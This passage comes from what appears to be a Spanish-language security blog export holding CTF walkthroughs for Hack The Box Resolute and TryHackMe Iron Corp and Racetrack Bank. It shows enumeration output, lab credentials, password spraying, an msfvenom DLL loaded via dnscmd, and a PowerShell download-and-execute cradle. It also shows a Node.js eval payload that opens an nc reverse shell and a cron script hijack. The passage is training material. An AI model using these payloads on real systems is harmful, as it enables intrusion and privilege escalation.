index: 0x10be RID: 0x19d8 acb: 0x00000010 Account: per\tName: (null)\tDesc: (null) index: 0x10a3 RID: 0x451 acb: 0x00000210 Account: ryan\tName: Ryan Bertrand\tDesc: (null) index: 0x10b2 RID: 0x19cc acb: 0x00000010 Account: sally\tName: (null)\tDesc: (null) index: 0x10c2 RID: 0x2777 acb: 0x00000010 Account: simon\tName: (null)\tDesc: (null) index: 0x10bb RID: 0x19d5 acb: 0x00000010 Account: steve\tName: (null)\tDesc: (null) index: 0x10b8 RID: 0x19d2 acb: 0x00000010 Account: stevie\tName: (null)\tDesc: (null) index: 0x10af RID: 0x19c9 acb: 0x00000010 Account: sunita\tName: (null)\tDesc: (null) index: 0x10b7 RID: 0x19d1 acb: 0x00000010 Account: ulf\tName: (null)\tDesc: (null) index: 0x10c1 RID: 0x2776 acb: 0x00000010 Account: zach\tName: (null)\tDesc: (null) user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[ryan] rid:[0x451] user:[marko] rid:[0x457] user:[sunita] rid:[0x19c9] user:[abigail] rid:[0x19ca] user:[marcus] rid:[0x19cb] user:[sally] rid:[0x19cc] user:[fred] rid:[0x19cd] user:[angela] rid:[0x19ce] user:[felicia] rid:[0x19cf] user:[gustavo] rid:[0x19d0] user:[ulf] rid:[0x19d1] user:[stevie] rid:[0x19d2] user:[claire] rid:[0x19d3] user:[paulo] rid:[0x19d4] user:[steve] rid:[0x19d5] user:[annette] rid:[0x19d6] user:[annika] rid:[0x19d7] user:[per] rid:[0x19d8] user:[claude] rid:[0x19d9] user:[melanie] rid:[0x2775] user:[zach] rid:[0x2776] user:[simon] rid:[0x2777] user:[naoki] rid:[0x2778] ========================================= | Share Enumeration on 10.10.10.169 | ========================================= Sharename Type Comment --------- ---- ------- SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.10.169 ==================================================== | Password Policy Information for 10.10.10.169 | ==================================================== [+] Attaching to 10.10.10.169 using a NULL share [+] Trying protocol 445/SMB... [+] Found domain(s): [+] MEGABANK [+] Builtin [+] Password Info for Domain: MEGABANK [+] Minimum password length: 7 [+] Password history length: 24 [+] Maximum password age: Not Set [+] Password Complexity Flags: 000000 [+] Domain Refuse Password Change: 0 [+] Domain Password Store Cleartext: 0 [+] Domain Password Lockout Admins: 0 [+] Domain Password No Clear Change: 0 [+] Domain Password No Anon Change: 0 [+] Domain Password Complex: 0 [+] Minimum password age: 1 day 4 minutes [+] Reset Account Lockout Counter: 30 minutes [+] Locked Account Duration: 30 minutes [+] Account Lockout Threshold: None [+] Forced Log off Time: Not Set [+] Retieved partial password policy with rpcclient: ============================== | Groups on 10.10.10.169 | ============================== [+] Getting builtin groups: group:[Account Operators] rid:[0x224] group:[Pre-Windows 2000 Compatible Access] rid:[0x22a] group:[Incoming Forest Trust Builders] rid:[0x22d] group:[Windows Authorization Access Group] rid:[0x230] group:[Terminal Server License Servers] rid:[0x231] group:[Administrators] rid:[0x220] group:[Users] rid:[0x221] group:[Guests] rid:[0x222] group:[Print Operators] rid:[0x226] group:[Backup Operators] rid:[0x227] group:[Replicator] rid:[0x228] group:[Remote Desktop Users] rid:[0x22b] group:[Network Configuration Operators] rid:[0x22c] group:[Performance Monitor Users] rid:[0x22e] group:[Performance Log Users] rid:[0x22f] group:[Distributed COM Users] rid:[0x232] group:[IIS_IUSRS] rid:[0x238] group:[Cryptographic Operators] rid:[0x239] group:[Event Log Readers] rid:[0x23d] group:[Certificate Service DCOM Access] rid:[0x23e] group:[RDS Remote Access Servers] rid:[0x23f] group:[RDS Endpoint Servers] rid:[0x240] group:[RDS Management Servers] rid:[0x241] group:[Hyper-V Administrators] rid:[0x242] group:[Access Control Assistance Operators] rid:[0x243] group:[Remote Management Users] rid:[0x244] group:[System Managed Accounts Group] rid:[0x245] group:[Storage Replica Administrators] rid:[0x246] group:[Server Operators] rid:[0x225] [+] Getting builtin group memberships: Group \u0026#39;IIS_IUSRS\u0026#39; (RID: 568) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;System Managed Accounts Group\u0026#39; (RID: 581) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Windows Authorization Access Group\u0026#39; (RID: 560) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Pre-Windows 2000 Compatible Access\u0026#39; (RID: 554) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Remote Management Users\u0026#39; (RID: 580) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Guests\u0026#39; (RID: 546) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Event Log Readers\u0026#39; (RID: 573) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Users\u0026#39; (RID: 545) has member: Could not initialise pipe samr. Error was NT_STATUS_INVALID_NETWORK_RESPONSE Group \u0026#39;Administrators\u0026#39; (RID: 544) has member: Couldn\u0026#39;t lookup SIDs [+] Getting local groups: group:[Cert Publishers] rid:[0x205] group:[RAS and IAS Servers] rid:[0x229] group:[Allowed RODC Password Replication Group] rid:[0x23b] group:[Denied RODC Password Replication Group] rid:[0x23c] group:[DnsAdmins] rid:[0x44d] [+] Getting local group memberships: Group \u0026#39;DnsAdmins\u0026#39; (RID: 1101) has member: Couldn\u0026#39;t lookup SIDs Group \u0026#39;Denied RODC Password Replication Group\u0026#39; (RID: 572) has member: Couldn\u0026#39;t lookup SIDs [+] Getting domain groups: group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] group:[Contractors] rid:[0x44f] [+] Getting domain group memberships: Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\Administrator Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\DefaultAccount Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\krbtgt Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ryan Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marko Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sunita Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\abigail Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\marcus Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\sally Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\fred Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\angela Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\felicia Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\gustavo Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\ulf Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\stevie Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claire Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\paulo Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\steve Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annette Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\annika Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\per Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\claude Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\melanie Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\zach Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\simon Group \u0026#39;Domain Users\u0026#39; (RID: 513) has member: MEGABANK\\naoki Group \u0026#39;Contractors\u0026#39; (RID: 1103) has member: MEGABANK\\ryan Group \u0026#39;Enterprise Admins\u0026#39; (RID: 519) has member: MEGABANK\\Administrator Group \u0026#39;Group Policy Creator Owners\u0026#39; (RID: 520) has member: MEGABANK\\Administrator Group \u0026#39;Domain Controllers\u0026#39; (RID: 516) has member: MEGABANK\\RESOLUTE$ Group \u0026#39;Schema Admins\u0026#39; (RID: 518) has member: MEGABANK\\Administrator Group \u0026#39;Domain Computers\u0026#39; (RID: 515) has member: MEGABANK\\MS02$ Group \u0026#39;Domain Guests\u0026#39; (RID: 514) has member: MEGABANK\\Guest Group \u0026#39;Domain Admins\u0026#39; (RID: 512) has member: MEGABANK\\Administrator ======================================================================= | Users on 10.10.10.169 via RID cycling (RIDS: 500-550,1000-1050) | ======================================================================= [E] Couldn\u0026#39;t get SID: NT_STATUS_ACCESS_DENIED. RID cycling not possible. ============================================= | Getting printer info for 10.10.10.169 | ============================================= Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED enum4linux complete on Mon Jan 6 16:32:54 2020   Enum4linux nos muestra la lista de grupos, usuarios, dominio, entre mucha otra informacion de interes, pero especificamente en la parte de usuarios nos muestra un comentario del usuario marko, el cual contiene un comentario en la descripcion y nos indica que la contraseña que le fue impuesta a este usuario es Welcome123!.\n1  index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko\tName: Marko Novak\tDesc: Account created. Password set to Welcome123!   Al intentar iniciar sesion o enumerar los SHARENAMES con smbmap y smbclient junto con las credenciales, no fue posible, utilizamos evil-winrm, ya que el puerto 5985 de winrm esta abierto en la maquina para intentar ingresar en ese puerto, pero nos muestra un mensaje de error de Autenticacion.\nUser - Melanie Sin descartar la contraseña que encontramos utilizamos un pequeño diccionario con los usuarios disponibles en la maquina y, junto a un pequeño script de bash y evil-winrm, intentar con cada usuario la contraseña Welcome123!. Al hacer esto logramos que la usuario Melanie iniciara sesion satisfactoriamente en winrm, obteniendo asi una shell y nuestra flag user.txt.\nUser - Ryan Al ingresar a la maquina hicimos una enumeracion de archivos, en el dsco C:/ encontramos un archivo que contiene un log de ejecucion de comandos, entre los comandos vemos que se utilizó net use junto con un usuario y una contraseña que pertenecen a ryan.\nCredenciales:\nryan:Serv3r4Admin4cc123! PRIVILEGE ESCALATION - Abusing DNSAdmins Utilizamos evil-winrm nuevamente para obtener una shell con el usuario ryan, enumeramos los grupos en los que el usuario se encuentra (Domain Users, Contractors).\nwhoami /groups nos da mejor informacion sobre este usuario, vemos que ryan pertenece a varios grupos, uno de ellos es MEGABANK\\DnsAdmins.\nYa que ryan pertenece a DnsAdmins vamos a explotar sus privilegios para poder cargar un fichero DLL con privilegios de administrador en el Servidor de DNS que la maquina tiene corriendo.\nAbusing DNSAdmins\nPrimero vamos a crear un archivo DLL con msfvenom para ejecutar una shell inversa hacia nuestra maquina.\n1  msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1339 --platform=windows -f dll \u0026gt; revshell.dll   Creamos un servidor de SAMBA utilizando las herramientas de impacket y ponemos a la escucha netcat en nuestra maquina o de igual forma con metasploit.\n1  python smbserver.py DLL .   Ya que el servidor DNS esta corriendo sobre el Domain Controller (DC) podemos utilizar simplemente dnscmd para poder cargar el DLL.\n1  dnscmd /config /serverlevelplugindll \\\\10.10.15.105\\DLL\\revshell.dll   Luego de ello vamos a parar e iniciar el servidor DNS nuevamente.\nsc.exe stop dns; sc.exe start dns Obtenemos una respuesta en nuestro servidor SMB y nuestra shell con privilegios de Administrador.\nSMB:\nObtenemos una sesion en Metasploit:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  msf5 exploit(multi/handler) \u0026gt; show options Module options (exploit/multi/handler): Name Current Setting Required Description ---- --------------- -------- ----------- Payload options (windows/x64/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: \u0026#39;\u0026#39;, seh, thread, process, none) LHOST 10.10.15.105 yes The listen address (an interface may be specified) LPORT 1339 yes The listen port Exploit target: Id Name -- ---- 0 Wildcard Target msf5 exploit(multi/handler) \u0026gt; exploit [*] Started reverse TCP handler on 10.10.15.105:1339 [*] Command shell session 1 opened (10.10.15.105:1339 -\u0026gt; 10.10.10.169:52284) at 2020-01-07 19:05:30 -0600 C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;   Cambiamos a una shell de windows y leemos nuestra flag root.txt.\n","description":"Resolute con SO Windows expone Samba y Ldap, lo que nos dio informacion para ingresar por WinRM. Encontramos credenciales en un archivo para tener acceso a un segundo usuario. Encontramos que el usuario petenece al grupo DnsAdmins, configuramos dnscmd con un payload de metasploit para conseguir una shell como administrador.","id":81,"section":"posts","tags":["enum4linux","evil-winrm","metasploit","impacket"],"title":"Hack The Box - Resolute","uri":"https://sckull.github.io/posts/resolute/"},{"content":"  Iron Corp es una maquina de TryHackMe, enumeramos subdominios con dig, con Hydra realizamos ataque de contraseñas a uno de los subdominios donde encontramos una vulnerabilidad LFI y donde realizamos Command Injection para obtener acceso por medio de una shell en PowerShell. Escalamos privilegios utilizando Metasploit con Incognito y un token que encontramos.\nRoom    Titulo Iron Corp      Descripción Can you get access to Iron Corp\u0026rsquo;s system?   Puntos 160   Dificultad Dificil   Maker MrSeth6797     NMAP Escaneo de puertos tcp, nmap nos muestra el puerto http (8080), rdp (3889) y el puerto dns (53) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  # Nmap 7.80 scan initiated Sat May 9 00:53:02 2020 as: nmap -Pn -T5 -p1-65535 -o scan_allports ironcorp.me Nmap scan report for ironcorp.me (10.10.84.168) Host is up (0.33s latency). Not shown: 65528 filtered ports PORT STATE SERVICE 53/tcp open domain 135/tcp open msrpc 3389/tcp open ms-wbt-server 8080/tcp open http-proxy 11025/tcp open unknown 49667/tcp open unknown 49670/tcp open unknown # Nmap done at Sat May 9 01:00:44 2020 -- 1 IP address (1 host up) scanned in 462.74 seconds # Nmap 7.80 scan initiated Sat May 9 01:12:08 2020 as: nmap -Pn -sV -sC -p53,135,3389,8080,11025,49667,49670 -o scan_allports_big ironcorp.me Nmap scan report for ironcorp.me (10.10.84.168) Host is up (0.17s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 135/tcp open msrpc Microsoft Windows RPC 3389/tcp open ms-wbt-server Microsoft Terminal Services | rdp-ntlm-info: | Target_Name: WIN-8VMBKF3G815 | NetBIOS_Domain_Name: WIN-8VMBKF3G815 | NetBIOS_Computer_Name: WIN-8VMBKF3G815 | DNS_Domain_Name: WIN-8VMBKF3G815 | DNS_Computer_Name: WIN-8VMBKF3G815 | Product_Version: 10.0.14393 |_ System_Time: 2020-05-09T06:14:42+00:00 | ssl-cert: Subject: commonName=WIN-8VMBKF3G815 | Not valid before: 2020-04-12T18:27:11 |_Not valid after: 2020-10-12T18:27:11 |_ssl-date: 2020-05-09T06:14:55+00:00; 0s from scanner time. 8080/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Dashtreme Admin - Free Dashboard for Bootstrap 4 by Codervent 11025/tcp open http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.4.4) | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4 |_http-title: Coming Soon - Start Bootstrap Theme 49667/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=5/9%Time=5EB649C4%P=x86_64-pc-linux-gnu%r(DNSVe SF:rsionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\x SF:04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat May 9 01:14:55 2020 -- 1 IP address (1 host up) scanned in 167.13 seconds   HTTP 8080 En el puerto 8080 encontramos una pagina en la que vemos un dashboard.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 13  root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp#   DIG - DNS Enumeration Utilizamos DIG para obtener informacion de los DNS.\nHacemos una transferencia de zona y encontramos dos nuevos subdominios.\nNuevamente ejecutamos Gobuster en los nuevos dos subdominios y encontramos las mismas direcciones que en el dominio principal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  root@upset:~/thm/ironcorp# gobuster dir -u http://internal.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp# gobuster dir -u http://admin.ironcorp.me:8080/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /assets (Status: 301) /calendar.html (Status: 200) /forms.html (Status: 200) /icons.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /profile.html (Status: 200) /register.html (Status: 200) root@upset:~/thm/ironcorp#   En los tres subdominios encontramos la misma pagina estatica.\nHTTP 11025 En el puerto 11025 encontramos una pagina en la que vemos un formulario de email.\nEn el subdominio internal.ironcorp.me al parecer no tiene nada\nEn el subdominio admin.ironcorp.me una autenticacion basica\nNuevamente ejecutamos Gobuster en el dominio principal pero no encontramos nada interesante.\n1 2 3 4 5 6 7 8 9 10 11  root@upset:~/thm/ironcorp# gobuster dir -u http://ironcorp.me:11025/ -w /usr/share/wordlists/dirb/common.txt -q -t 50 -x php,html,txt,aspx,asp -s 200,301 /css (Status: 301) /img (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /Index.html (Status: 200) /js (Status: 301) /license (Status: 200) /LICENSE (Status: 200) /vendor (Status: 301) root@upset:~/thm/ironcorp#   HYDRA Utilizamos hydra para realizar un ataque de fuerza bruta en el subdominio admin.ironcorp.me, logramos encontrar las credenciales.\nLFI/Command Injection - Admin Area En el subdominio en el que encontramos las credenciales al iniciar sesion nos muestra una pagina en la que contiene un input para realizar querys.\nAl realizar alguna busqueda o query no nos devuelve ningun resultado, intentamos realizar un RFI mediante una shell php, asp, apsx, pero ninguna de estas funcionó, solamente nos trae el codigo fuente y lo muestra en la pagina más no lo ejecuta.\nIntentamos leer archivos de sistema como index.php pero no logra obtener el archivo incluso utilizando localhost:11025/index.php, pero para poder obtener el codigo de esta pagina podemos utilizar el propio dominio y/o subdominio que tiene la maquina en su archivo c:\\Windows\\System32\\Drivers\\etc\\hosts para que la propia maquina reconozca su subdominio y obtenga el codigo fuente.\nAl hacer esto encontramos un subdominio que si funcionó y nos trajo el codigo fuente del index.php, donde nos muestra un mensaje.\nAl dirigirnos a la direccion que nos muestra, al parecer no tenemos permisos para ver el archivo.\nLe pasamos el dominio con la pagina para obtener su codigo fuente como la pagina de index.php anterior y logramos ver que el codigo se ejecuta y se muestra en la pagina, pero no nos muestra el codigo fuente.\nLe pasamos un nombre como parametro y se muestra en la pagina.\nIntentamos ejecutar codigos en la maquina con Command Injection utilizando shell scape. Logramos obtener la ejecucion de whoami y vemos que el usuario tiene permisos de super usuario (nt authority\\system).\nSHELL - Administrator Utilizamos una de las shells que tiene nishang Invoke-PowerShellTcp.ps1, en nuestro archivo Invoke-PowerShellTcp.ps1 agregamos la siguiente linea al final del archivo para ejecutar nuestra shell inversa cuando este sea descargado, con la IP y el puerto al que se va a conectar.\n1  Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1338   El comando que vamos a ejecutar en la maquina es el siguiente, para ejecutar nuestra shell\n1  powershell.exe -c iex(new-object net.webclient).downloadstring(\u0026#39;http://10.10.10.10/Invoke-PowerShellTcp.ps1\u0026#39;)   Por alguna razon no acepta los espacios y hay que codificar nuestro comando dos veces para que se ejecute\nEjecutamos y logramos obtener nuestra shell\nY nuestra primera flag user.txt\nPRIVILEGE ESCALATION Utilizamos metasploit para conseguir una shell meterpreter utilizando un payload en powershell.\nmetasploit\nmsfconsole -x \u0026quot;use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost tun0; set lport 1337; set ExitOnSession false; exploit -j\u0026quot; shell\npowershell -command \u0026quot;\u0026amp; { iwr 10.10.10.10/meterpreter-64.ps1 -OutFile C:\\Users\\Administrator\\Desktop\\meterpreter-64.ps1 }\u0026quot; Import-Module .\\meterpreter-64.ps1 Logramos obtener una sesion en meterpreter y los hashes de los usuarios :)\nPero lastimosamente no podemos utilizar estas credenciales ya que no existe algun servicio en donde podamos utilizarlas, es por eso que utilizamos incognito para poder obtener los tokens del usuario Admin, utilizarlas y obtener nuestra flag root.txt y una shell con ese usuario.\nListamos las tokens y las utilizamos.\n","description":"Iron Corp es una maquina de TryHackMe, enumeramos subdominios con dig, con Hydra realizamos ataque de contraseñas a uno de los subdominios donde encontramos una vulnerabilidad LFI y donde realizamos Command Injection para obtener acceso por medio de una shell en PowerShell. Escalamos privilegios utilizando Metasploit con Incognito y un token que encontramos.","id":82,"section":"posts","tags":["dig","lfi","nishang","metasploit"],"title":"TryHackMe - Iron Corp","uri":"https://sckull.github.io/posts/ironcorp/"},{"content":"  Racetrack Bank es una maquina de TryHackMe involucra transferencia asincrona para ganar privilegios en una aplicacion web lo que nos dio acceso a la maquina tras ejecutar una shell inversa. Escalamos privilegios modificando un script utilizado por un CronJob.\nRoom    Titulo Racetrack Bank      Descripción It\u0026rsquo;s time for another heist.   Puntos 110   Dificultad Dificil   Maker deltatemporal     NMAP 1 2 3 4 5 6 7 8 9 10 11 12  Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos. # Nmap 7.80 scan initiated Tue May 12 17:18:37 2020 as: nmap -sV -o nmap_scan_mini racetrackbank.thm Nmap scan report for racetrackbank.thm (10.10.163.203) Host is up (0.36s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.14.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue May 12 17:20:04 2020 -- 1 IP address (1 host up) scanned in 86.52 seconds   HTTP En el puerto 80 encontramos una pagina en la que vemos una pagina sencilla\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos.\n1 2 3 4 5 6 7 8 9 10 11 12  root@upset:~/thm/racetrackbank# gobuster dir -u http://racetrackbank.thm/ -w /usr/share/wordlists/dirb/common.txt -q -t 25 -x php,html,txt /create.html (Status: 200) /home.html (Status: 302) /Home.html (Status: 302) /images (Status: 301) /Images (Status: 301) /Index.html (Status: 200) /index.html (Status: 200) /index.html (Status: 200) /login.html (Status: 200) /Login.html (Status: 200) /purchase.html (Status: 302)   Creamos una cuenta en la pagina y al iniciar sesion nos encontramos con un mensaje en el que indica que nos han dado 1 Gold y en la parte superior derecha vemos la cantidad.\nTambien vemos la pagina de Purchase y Give Gold, en la primera podemos comprar una cuenta premium, en la segunda podemos regalar a un usuario Golds segun la cantidad que querramos.\nAl analizar el codigo fuente de estas paginas, encontramos que existe una tercera pagina premiumfeatures.html en la cual no tenemos acceso.\nAnalizamos las peticiones con Burpsuite y vemos que en el header de la respuesta Express por lo que podemos deducir que la pagina esta corriendo en NodeJS.\nTransferencia Asincrona GOLD - WFUZZ Creamos una segunda cuenta, para poder regalar Gold a esta desde la primera cuenta. Le damos 1 Gold a pika desde test, y al hacer esto, test se queda en 0 y pika tiene 2, entonces, dependiendo de cuantas Gold tengamos, esa cantidad podemos regalar, hay que mencionar que se tarda en realizar la transaccion.\nHasta este punto, no habia otra parte en donde podriamos realizar alguna explotacion, por lo que podríamos crear 10 mil cuentas y utilizar esas cuentas para dar a una sola los 10,000 Gold para comprar una cuenta premium y ver lo que hay ahí pero no seria lo mejor.\nRegresamos y revisamos el nombre de la maquina para ver si tenemos una alguna pista como en la maquina Mango - HackTheBox que en su nombre nos indicaba la base de datos Mongo, en el caso de esta maquina nos menciona Racetrack que al investigar acerca de este nombre podría hacer referencia al paquete racetrack - npm que se encarga de verificar las peticiones asincronas.\nHaciendo referencia a la funcionalidad Asíncrona del paquete, utilizamos wfuzz para realizar multiples peticiones en las que realizamos una transferencia de Gold de una cuenta a otra. Utilizamos un diccionario en el cual tenemos mil lineas con el numero 1 para poder utilizar en el parametro FUZZ necesario en wfuzz. Pero primero capturamos la peticion de transferencia y eliminamos los elementos del header que no son necesarios, la sintaxis quedaría de la siguiente forma:\nTransaccion de pika a test\nwfuzz -u http://racetrackbank.thm/api/givegold -H \u0026quot;Content-Type: application/x-www-form-urlencoded\u0026quot; -b \u0026quot;connect.sid=s%3A1WZ2nxR7AU8055fkeBW_cLlTaLFVV6Sk.zoPUEOLRtqGfnyd291VT%2BJuzMlkFKT6NAxVjuSExNsY\u0026quot; -d \u0026quot;user=test\u0026amp;amount=FUZZ\u0026quot; Al ejecutar esto obtenemos multiples respuestas 302, en donde las primeras diez tienen menos caracteres (agregamos --sh 54 a wfuzz) que las siguientes.\nRevisamos la cuenta de test y vemos que tenemos más Gold, por lo que es muy probable que tenga la funcionalidad asincrona.\nAhora realizamos una transaccion de test a pika y volvemos a hacer lo mismo con wfuzz (aumentamos 5 en 5 nuestro diccionario) asi hasta lograr los Gold necesarios para una cuenta premium en la cuenta test. Por alguna razon al realizar esta \u0026ldquo;explotacion\u0026rdquo; en ambas cuentas aumentan los Gold.\nBRIAN USER - RCE NodeJS Hacemos la compra de una cuenta Premium, y podemos acceder a la pagina Premium Features donde encontramos un input que al ingresar una operacion matematica nos devuelve el resultado.\nNODEJS RCE\nUtilizamos el payload process.cwd() para verificar el PATH donde esta la pagina ejecutandose, nos devuelve la carpeta principal de uno de los usuarios, el payload funciona y podemos intentar obtener una shell utilizando require().\nPonemos a la escucha nuestro netcat (rlwrap nc -lvp 1338) y ejecutamos nuestro payload en la pagina require(\u0026quot;child_process\u0026quot;).exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f') utilizando burpsuite, codificamos nuestro payload.\nLogramos obtener una shell y nuestra flag user.txt.\nVemos el codigo fuente de la pagina PremiumFeatures donde eval esta presente.\nTambien encontramos las credenciales de la base de datos\nPRIVILEGE ESCALATION Dentro de la maquina encontramos un binario el cual tiene permisos root, pero al anlizarlo y ejecutarlo no se pudo hacer mayor cosa.\nUtilizamos pspy para ver los cron job, y encontramos uno que ejecuta cleanupscript.sh que se encuentra en /home/brian/cleanup/.\nCambiamos de nombre al archivo, creamos uno nuevo con el mismo nombre y agregamos un comando para obtener la flag root.txt, esperamos y obtuvimos el contenido.\nAgregamos una shell inversa al archivo y obtenemos una shell con usuario root.\n","description":"Racetrack Bank es una maquina de TryHackMe involucra transferencia asincrona para ganar privilegios en una aplicacion web lo que nos dio acceso a la maquina tras ejecutar una shell inversa. Escalamos privilegios modificando un script utilizado por un CronJob.","id":83,"section":"posts","tags":["nodejs","suid","cron"],"title":"TryHackMe - Racetrack Bank","uri":"https://sckull.github.io/posts/racetrackbank/"},{"content":"  Obscurity tiene expuesto el codigo fuente de la aplicacion web, descubrimos una vulnerabilidad la cual nos dio acceso con un pequeño script en Python. Encontramos un script que nos ayudó a obtener las credenciales del siguiente usuario. Finalmente un script que obtiene el contenido de /etc/shadow nos permitio crackear la contraseña del usuario root para escalar privilegios.\nInformacion de la Maquina    Nombre Obscurity      OS Linux   Puntos 30   Dificultad Media   IP 10.10.10.168   Maker clubby789    Matrix   { \u0026quot;type\u0026quot;:\u0026quot;radar\u0026quot;, \u0026quot;data\u0026quot;:{ \u0026quot;labels\u0026quot;:[\u0026quot;Enumeration\u0026quot;,\u0026quot;Real-Life\u0026quot;,\u0026quot;CVE\u0026quot;,\u0026quot;Custom Explotation\u0026quot;,\u0026quot;CTF-Like\u0026quot;], \u0026quot;datasets\u0026quot;:[ { \u0026quot;label\u0026quot;:\u0026quot;User 